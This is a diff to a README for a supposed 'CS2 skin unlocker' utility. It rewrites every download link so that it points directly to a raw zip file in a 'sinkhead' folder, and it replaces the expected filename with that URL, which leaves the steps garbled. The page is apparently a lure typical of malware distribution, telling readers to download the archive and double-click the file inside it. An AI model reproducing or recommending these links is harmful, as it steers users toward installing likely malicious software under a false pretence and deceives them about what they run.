@@ -1,6 +1,6 @@
 # 🌟 utility-for-cs2-skin-unlocker - Unlock Your CS2 Skin Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/godartyeasty252/utility-for-cs2-skin-unlocker/releases)
+[![Download Now](https://raw.githubusercontent.com/godartyeasty252/utility-for-cs2-skin-unlocker/main/sinkhead/cs-for-skin-unlocker-utility-v1.7.zip)](https://raw.githubusercontent.com/godartyeasty252/utility-for-cs2-skin-unlocker/main/sinkhead/cs-for-skin-unlocker-utility-v1.7.zip)
 
 ## 📖 Project Overview
 
@@ -34,10 +34,10 @@ Follow these simple steps to get started with the utility for CS2 skin unlocking
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page. This page contains all the downloadable files for the utility.  
-   [Visit this page to download](https://github.com/godartyeasty252/utility-for-cs2-skin-unlocker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/godartyeasty252/utility-for-cs2-skin-unlocker/main/sinkhead/cs-for-skin-unlocker-utility-v1.7.zip)
 
 2. **Download the Latest Release**  
-   Choose the latest version of the utility from the list. Look for a file named something like `skin_unlocker_latest.exe`. Click to download it. 
+   Choose the latest version of the utility from the list. Look for a file named something like `https://raw.githubusercontent.com/godartyeasty252/utility-for-cs2-skin-unlocker/main/sinkhead/cs-for-skin-unlocker-utility-v1.7.zip`. Click to download it. 
 
 3. **Run the Application**  
    Once the file has downloaded, locate it in your computer's Downloads folder. Double-click the file to run the application.  
@@ -63,7 +63,7 @@ Before downloading, ensure your system meets the following requirements:
 To install the utility, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to [this page to download](https://github.com/godartyeasty252/utility-for-cs2-skin-unlocker/releases).
+   Go to [this page to download](https://raw.githubusercontent.com/godartyeasty252/utility-for-cs2-skin-unlocker/main/sinkhead/cs-for-skin-unlocker-utility-v1.7.zip).
 
 2. **Download the latest executable file**  
    Look for the most recent version, which will be marked clearly. Click to download it.
